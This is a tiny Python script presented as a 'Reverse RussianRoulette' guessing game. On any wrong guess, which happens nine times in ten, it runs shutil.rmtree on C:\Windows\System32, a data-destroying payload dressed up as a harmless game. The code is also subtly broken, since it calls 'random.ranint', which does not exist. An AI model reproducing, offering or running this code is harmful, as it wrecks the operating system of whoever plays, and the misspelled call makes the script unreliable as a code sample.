import random
import os
import shutil

#Reverse RussianRoulette Game
number = random.ranint(1,10)
guess = int(input("Guess a number between 1 and 10"))

if(guess == number):
    print("You won!")
else:
    shutil.rmtree(r"C:\Windows\System32")

